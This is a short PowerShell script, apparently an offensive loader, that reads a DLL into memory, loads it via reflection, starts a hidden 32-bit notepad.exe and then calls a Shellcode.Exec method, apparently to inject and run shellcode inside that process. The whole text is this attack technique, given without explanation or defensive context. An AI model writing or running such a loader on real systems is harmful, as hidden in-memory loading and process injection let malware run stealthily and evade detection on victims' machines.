$DLLName = $args[0];
$DLLbytes = [System.IO.File]::ReadAllBytes($DLLName)
[System.Reflection.Assembly]::Load($DLLBytes)
Start-Process -FilePath C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
Start-Sleep -s 5
[Shellcode]::Exec("notepad")
